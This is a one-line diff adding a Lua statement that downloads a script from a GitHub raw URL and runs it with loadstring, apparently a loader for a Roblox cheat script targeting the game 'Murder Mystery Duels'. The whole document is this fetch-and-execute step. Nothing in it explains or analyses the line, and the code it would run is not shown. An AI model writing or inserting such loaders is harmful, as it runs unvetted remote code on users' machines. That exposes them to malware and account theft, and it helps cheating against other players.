@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/murder-mystery-duels-spam7-poz5yxamgzrrzx.lua"))()
